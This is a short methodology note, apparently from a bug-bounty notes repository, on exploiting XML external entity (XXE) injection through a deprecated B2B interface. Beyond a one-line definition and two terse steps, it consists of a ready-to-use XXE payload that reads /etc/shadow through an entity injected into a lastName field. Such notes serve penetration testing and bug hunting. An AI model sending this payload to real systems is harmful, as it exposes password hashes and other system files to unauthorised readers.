## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80">   Deprecated Interface XXE injection
Use a deprecated B2B interface that was not properly shut down. XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data.
- search xxe payload
- look for POST requests
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&xxe;</lastName>
</userInfo>
```
